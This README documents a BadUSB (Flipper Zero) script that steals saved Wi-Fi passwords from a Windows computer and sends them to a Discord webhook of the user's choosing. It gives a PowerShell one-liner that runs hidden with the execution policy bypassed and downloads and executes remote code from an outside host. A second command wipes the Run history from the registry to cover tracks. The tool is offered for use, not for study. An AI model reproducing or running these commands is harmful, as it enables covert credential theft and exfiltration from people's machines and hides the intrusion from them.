# WLAN Windows Password - BadUSB

A script used to acquire target WLAN Passwords on a Windows machine and send them using a Discord webhook of your choosing.

**Category**: WLAN, Credentials

## Description

A script used to acquire target WLAN Passwords on a Windows machine and send them using a Discord webhook of your choosing.

Opens PowerShell hidden, grabs wlan passwords, saves as a cleartext in a variable and exfiltrates info via Discord Webhook.

Then clears run history.

## Getting Started

### Dependencies

* An internet connection
* Windows 10,11

# Usage
Replace `https://discord.com/api/webhooks/<channel_id>/<webhook_id>` with your own [webhook url](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks).
### Powershell
```powershell
powershell -w h -ep bypass $discord='<your_webhook_here>';irm winwifi.remothe.dev | iex

powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue" | iex
```

### Executing program | Flipper Zero
* Plug in your device
* Invoke 2 netsh commands
* Invoke-WebRequest will be entered in the Run Box to send the content
* Invoke-powershell command to remove 'Run' history values from Registry

## Credits

- [RemoTheDev](https://remothe.dev) - Modified script and deleted redundancies for subjectively more efficent use and less space.
- [Aleff](https://aleff-github.github.io/) - BadUSB script foundation
